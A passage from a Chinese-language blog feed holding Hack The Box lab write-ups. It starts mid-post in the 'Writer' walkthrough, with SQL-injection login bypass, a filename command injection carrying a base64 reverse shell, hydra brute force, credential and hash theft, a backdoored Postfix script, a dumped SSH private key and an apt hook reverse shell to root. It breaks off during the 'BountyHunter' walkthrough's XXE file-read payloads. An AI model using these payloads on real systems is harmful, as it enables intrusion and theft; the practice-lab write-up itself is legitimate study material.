games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh john:x:1001:1001:,,,:/home/john:/bin/bash mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false 咱们去登录一下后台看一下，使用万能密码 username = admin&#39;;--+ password = password 登录成功 我发现该后台有上传功能，不过只能上传图片 不过没有关系，咱们制作一个图片马就可以了 step 1 echo -n &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.110/9001 0&gt;&amp;1&quot;&#39; | base64 将反弹shell的语句转换为base64格式 step 2 随便准备一张图片，我这里就用的1.jpg step 3 touch &#39;1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;&#39; 将图片和木马绑定在一起，生成一个图片马的格式(严格意义上说不是图片马，毕竟只是一个后缀绕过) step 4 file:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;# 上传的时候所使用的执行语句 step 5 nc -nvlp 9001 使用nc监听端口 上面是一个大致的利用步骤，咱们现在来详细进行利用 首先前三步生成图片马就不说了，稍微修改一下指令然后输入即可 在进入第四步之前，咱们需要先登入后台 然后修改一篇文章 修改过程中然后上传我们制作的木马 然后我们使用burp进行抓包，然后再进行修改 修改后以后，使用nc监听我们指定的端口，然后执行流量包即可 ┌──(root💀root)-[~/Desktop] └─# nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 48906 bash: cannot set terminal process group (1061): Inappropriate ioctl for device bash: no job control in this shell www-data@writer:/$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功获得一个www-data权限的shell 至于上面用到的图片的路径怎么得来的，咱们在之前爆破的时候获得了一个/static路径，进入后发现可以目录遍历 http://10.10.11.101/static/img/ 咱们在这个路径即可看到我们上传的文件，再利用sql注入处的文件读取读取配置文件，即可知道绝对路径 暂时在这又卡壳了，查看一下home目录 www-data@writer:/home$ ls ls john kyle 这里有两个思路 使用hydra爆破kyle的密码 读取mysql的配置，直接进数据库拿kyle的hash 咱们先来看看第一个，hydra爆破密码 ┌──(root💀root)-[~/Desktop] └─# hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-05 05:16:18 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task [DATA] attacking ssh://10.10.11.101:22/ [STATUS] 121.00 tries/min, 121 tries in 00:01h, 9318 to do in 01:18h, 16 active [STATUS] 112.33 tries/min, 337 tries in 00:03h, 9102 to do in 01:22h, 16 active [STATUS] 99.71 tries/min, 698 tries in 00:07h, 8741 to do in 01:28h, 16 active [STATUS] 97.27 tries/min, 1459 tries in 00:15h, 7980 to do in 01:23h, 16 active [STATUS] 96.23 tries/min, 2983 tries in 00:31h, 6456 to do in 01:08h, 16 active [STATUS] 96.04 tries/min, 4514 tries in 00:47h, 4925 to do in 00:52h, 16 active [STATUS] 95.70 tries/min, 6029 tries in 01:03h, 3410 to do in 00:36h, 16 active [STATUS] 95.49 tries/min, 7544 tries in 01:19h, 1895 to do in 00:20h, 16 active [STATUS] 95.18 tries/min, 9042 tries in 01:35h, 397 to do in 00:05h, 16 active [22][ssh] host: 10.10.11.101 login: kyle password: marcoantonio 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 2 final worker threads did not complete until end. [ERROR] 2 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-05 06:55:10 然后是第二个，进入数据库拿kyle的hash www-data@writer:/$ cd /etc/mysql cd /etc/mysql www-data@writer:/etc/mysql$ ls ls conf.d debian-start debian.cnf mariadb.cnf mariadb.conf.d my.cnf my.cnf.fallback www-data@writer:/etc/mysql$ cat mariadb.cnf cat mariadb.cnf # The MariaDB configuration file # # The MariaDB/MySQL tools read configuration files in the following order: # 1. &quot;/etc/mysql/mariadb.cnf&quot; (this file) to set global defaults, # 2. &quot;/etc/mysql/conf.d/*.cnf&quot; to set global options. # 3. &quot;/etc/mysql/mariadb.conf.d/*.cnf&quot; to set MariaDB-only options. # 4. &quot;~/.my.cnf&quot; to set user-specific options. # # If the same option is defined multiple times, the last one will apply. # # One can use all long options that the program supports. # Run program with --help to get a list of available options and with # --print-defaults to see which it would actually understand and use. # # This group is read both both by the client and the server # use it for options that affect everything # [client-server] # Import all .cnf files from configuration directory !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/ [client] database = dev user = djangouser password = DjangoSuperPassword default-character-set = utf8 拿到mysql数据库账号密码，进入数据库拿kyle用户的hash值 www-data@writer:/etc/mysql$ mysql -u djangouser -h 127.0.0.1 -p mysql -u djangouser -h 127.0.0.1 -p Enter password: DjangoSuperPassword Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 1508 Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [dev]&gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | dev | | information_schema | +--------------------+ 2 rows in set (0.001 sec) MariaDB [dev]&gt; use dev; use dev; Database changed MariaDB [dev]&gt; show tables; show tables; +----------------------------+ | Tables_in_dev | +----------------------------+ | auth_group | | auth_group_permissions | | auth_permission | | auth_user | | auth_user_groups | | auth_user_user_permissions | | django_admin_log | | django_content_type | | django_migrations | | django_session | +----------------------------+ 10 rows in set (0.000 sec) MariaDB [dev]&gt; SELECT * FROM auth_user; SELECT * FROM auth_user; +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ | id | password | last_login | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined | +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ | 1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL | 1 | kyle | | | kyle@writer.htb | 1 | 1 | 2021-05-19 12:41:37.168368 | +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ 1 row in set (0.000 sec) 成功得到hash值 pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= 然后保存到本地文件 使用john或者hashcat进行爆破即可 hashcat -a 0 -m 10000 hash --wordlist /usr/share/wordlists/rockyou.txt 成功得到用户kyle的账号密码 username = kyle password = marcoantonio 咱们使用ssh进行登录 kyle@writer:~$ cat user.txt 70dc74ad2b72d9bf163b98822d6222a9 成功获得user权限的flag ## 权限提升 咱们准备两个脚本 #!/bin/bash # Localize these. bash -i &amp;&gt;/dev/tcp/10.10.14.110/4444 0&gt;&amp;1 INSPECT_DIR=/var/spool/filter SENDMAIL=/usr/sbin/sendmail # Get disclaimer addresses DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses # Exit codes from &lt;sysexits.h&gt; EX_TEMPFAIL=75 EX_UNAVAILABLE=69 # Clean up when done or when aborting. trap &quot;rm -f in.$$&quot; 0 1 2 3 15 # Start processing. cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit $EX_TEMPFAIL; } cat &gt;in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; } # obtain From address from_address=`grep -m 1 &quot;From:&quot; in.$$ | cut -d &quot;&lt;&quot; -f 2 | cut -d &quot;&gt;&quot; -f 1` if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then /usr/bin/altermime --input=in.$$ \\ --disclaimer=/etc/postfix/disclaimer.txt \\ --disclaimer-html=/etc/postfix/disclaimer.txt \\ --xheader=&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot; || \\ { echo Message content rejected; exit $EX_UNAVAILABLE; } fi $SENDMAIL &quot;$@&quot; &lt;in.$$ exit $? 这是修改原文件/etc/postfix/disclaimer后得到的脚本，这里只是举个例子，该靶机无法使用bash和sh进行反弹shell。可以使用python或socat进行getshell，由于懒，我就不修改了 查看文件/etc/postfix/disclaimer_addresses得到邮箱kyle@writer.htb 使用该邮箱编写脚本 import smtplib host = &#39;127.0.0.1&#39; port = 25 sender_email = &quot;kyle@writer.htb&quot; receiver_email = &quot;kyle@writer.htb&quot; message = &quot;&quot;&quot;\\ Subject: Hi there Test_python_sender.&quot;&quot;&quot; try: server = smtplib.SMTP(host, port) server.ehlo() server.sendmail(sender_email, receiver_email, message) except Exception as e: print(e) finally: server.quit() 这是发送邮件的脚本 上传到服务器 然后使用nc监听端口 nc -nvlp 4444 拷贝disclaimer文件并发送邮件 cp disclaimer /etc/postfix/disclaimer &amp;&amp; python3 sendmail.py 成功得到john的shell ┌──(root💀root)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 44352 bash: cannot set terminal process group (78664): Inappropriate ioctl for device bash: no job control in this shell john@writer:/var/spool/postfix$ whoami&amp;&amp;id whoami&amp;&amp;id john uid=1001(john) gid=1001(john) groups=1001(john) 得到john的权限，在/home/john/.ssh/目录下拿到id_rsa文件，保存到本地 -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- 给予权限 chmod 600 id_rsa 然后使用ssh进行登录john用户 ssh john@10.10.11.101 -i id_rsa 登入后提权 &gt; 参考连接 https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/ cd /etc/apt/apt.conf.d echo &#39;apt::Update::Pre-Invoke {&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.110 4444 &gt;/tmp/f&quot;};&#39; &gt; exp 然后本地监听一个端口 nc -nvlp 4444 然后等着root执行该脚本即可，可能需要等几分钟 ┌──(root💀root)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 41008 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami &amp;&amp; id root uid=0(root) gid=0(root) groups=0(root) 成功提权到root # cat root.txt 3664a02fe4477fdc202e27ec4e29de82 成功拿到root权限的flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"BountyHunter - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-BountyHunter","date":"2021-07-25T11:38:36.000Z","updated":"2023-06-13T03:41:25.000Z","comments":true,"path":"2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/","link":"","permalink":"http://www.lucifiel.com/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/","excerpt":"","text":"Hackthebox - BountyHunter靶场信息 靶场类型 信息搜集使用nmap进行端口扫描 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.11.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 13:02 CST Nmap scan report for 10.10.11.100 Host is up (0.25s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/25%OT=22%CT=1%CU=31546%PV=Y%DS=2%DC=T%G=Y%TM=60FCF27 OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 251.53 ms 10.10.14.1 2 251.65 ms 10.10.11.100 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 546.93 seconds 从扫描结果中，我们可以得到如下几个信息： - 本台靶机开启了22、80端口 - 本台80端口使用了Apache&#x2F;2.4.41作为HTTP服务 咱们去访问80端口看看内容。 这好像是一个SRC平台？专业对口 发现了一个php文件 http://10.10.11.100/log_submit.php 简单测试了一下XSS，但是没有成功，先放着不管我们找找其他思路 先做一个FUZZ看看吧 ┌──(root💀root)-[~/Desktop] └─# gobuster dir -u http://10.10.11.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.100 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/07/25 13:24:30 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 277] /.hta.txt (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htpasswd.php (Status: 403) [Size: 277] /.hta (Status: 403) [Size: 277] /.hta.php (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.hta.html (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.htpasswd.txt (Status: 403) [Size: 277] /assets (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/] /css (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/] /db.php (Status: 200) [Size: 0] /index.php (Status: 200) [Size: 25169] /index.php (Status: 200) [Size: 25169] /js (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/] /portal.php (Status: 200) [Size: 125] /resources (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/] /server-status (Status: 403) [Size: 277] =============================================================== 2021/07/25 13:32:25 Finished =============================================================== 咱们看看/resources目录 Index of /resources [ICO] Name Last modified Size Description [PARENTDIR] Parent Directory - [TXT] README.txt 2021-04-06 00:01 210 [ ] all.js 2021-04-05 17:37 1.1M [ ] bootstrap.bundle.min.js 2021-04-05 17:41 82K [ ] bootstrap_login.min.js 2021-04-05 17:08 48K [ ] bountylog.js 2021-06-15 15:47 594 [ ] jquery.easing.min.js 2020-05-04 09:11 2.5K [ ] jquery.min.js 2020-05-04 16:01 87K [ ] jquery_login.min.js 2021-04-05 17:09 85K [TXT] lato.css 2021-04-05 17:39 2.6K [TXT] monsterat.css 2021-04-05 17:39 3.2K Apache/2.4.41 (Ubuntu) Server at 10.10.11.100 Port 80 咱们挨个查看一下 在README.txt中发现了一个提示 Tasks: [ ] Disable &#39;test&#39; account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions 咱们把目光放在/bountylog.js这个文件上 function returnSecret(data) { return Promise.resolve($.ajax({ type: &quot;POST&quot;, data: {&quot;data&quot;:data}, url: &quot;tracker_diRbPr00f314.php&quot; })); } async function bountySubmit() { try { var xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;bugreport&gt; &lt;title&gt;${$(&#39;#exploitTitle&#39;).val()}&lt;/title&gt; &lt;cwe&gt;${$(&#39;#cwe&#39;).val()}&lt;/cwe&gt; &lt;cvss&gt;${$(&#39;#cvss&#39;).val()}&lt;/cvss&gt; &lt;reward&gt;${$(&#39;#reward&#39;).val()}&lt;/reward&gt; &lt;/bugreport&gt;` let data = await returnSecret(btoa(xml)); $(&quot;#return&quot;).html(data) } catch(error) { console.log(&#39;Error:&#39;, error); } } 漏洞利用看到这里咱们梳理一下思路哈 http://10.10.11.100/log_submit.php中提示是一个提交窗口 http://10.10.11.100/resources/README.txt中提示我们要写一个提交脚本到数据库，但我们目前并不知道要写什么脚本 http://10.10.11.100/resources/bountylog.js中提示我们要编写一个XML脚本提交到tracker_diRbPr00f314.php，并且给出了我们脚本格式 我们访问tracker_diRbPr00f314.php后可以看到，内容就是http://10.10.11.100/log_submit.php提交后返回的内容 平时我是不会写这么详细的，这里单纯是怼某个说我抄别人内容的杠精，给你看看我的解题思路，看看到底是抄的别人的还是我自己想的，实名制DISS你，不服随时来杠 然后咱们整理一下手上有的信息 1. 咱们手里有一个提交窗口/log_submit.php 2. 咱们有一个一看就很重要但没有内容的文件/db.php 3. 有一个XML注入的示例脚本 OK，目标很明确了，咱们使用XML注入去读取/db.php文件的内容即可 针对该目标编写脚本 var xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;&gt; ]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;something&lt;/cwe&gt; &lt;cvss&gt;something&lt;/cvss&gt; &lt;reward&gt;something&lt;/reward&gt; &lt;/bugreport&gt;` 提交到控制台，然后使用 returnSecret(btoa(xml)); 来进行读取 成功读取到该文件，咱们看看内容是什么 If DB were ready, would have added: &lt;table&gt; &lt;tr&gt; &lt;td&gt;Title:&lt;/td&gt; &lt;td&gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;CWE:&lt;/td&gt; &lt;td&gt;something&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Score:&lt;/td&gt; &lt;td&gt;something&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Reward:&lt;/td&gt; &lt;td&gt;something&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 看title返回的内容是一段base64码，咱们去解密试试 PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo= &lt;?php // TODO -&gt; Implement login system with the database. $dbserver = &quot;localhost&quot;; $dbname = &quot;bounty&quot;; $dbusername = &quot;admin&quot;; $dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;; $testuser = &quot;test&quot;; ?&gt; 咱们得到了数据库的账号密码，咱们读取/etc/passwd看看 var xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;something&lt;/cwe&gt; &lt;cvss&gt;something&lt;/cvss&gt; &lt;reward&gt;something&lt;/reward&gt; &lt;/bugreport&gt;` root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 